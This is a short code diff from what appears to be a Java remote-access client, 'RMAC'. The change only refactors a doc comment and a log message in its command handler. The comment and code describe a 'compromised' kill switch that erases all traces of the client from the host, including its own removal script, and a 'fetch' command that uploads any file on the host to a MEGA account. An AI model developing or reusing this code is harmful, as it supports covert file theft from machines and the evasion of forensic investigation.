@@ -15,8 +15,7 @@ import lombok.extern.slf4j.Slf4j;
  * Commands:
  * <br>
  * <code>compromised</code> : Kill switch that removes all footprints of this client on host
- * machine,
- * including the script performing the removal.
+ * machine, including the script performing the removal.
  * <br><br>
  * <code>fetch</code> : Upload any accessible file from this host machine to the configured MEGA
  * account.
@@ -96,7 +95,7 @@ public class CommandHandler {
           case "fetch": {
             String filePath = currCommand.substring(currCommand.indexOf(' ') + 1);
             if ("".equals(filePath) || !currCommand.contains(" ")) {
-              log.warn("Invalid command '" + currCommand + "'");
+              log.warn(Constants.LITERAL_INVALID_COMMAND + currCommand + "'");
               continue;
             }
             if (RMAC.fs.exists(filePath)) {
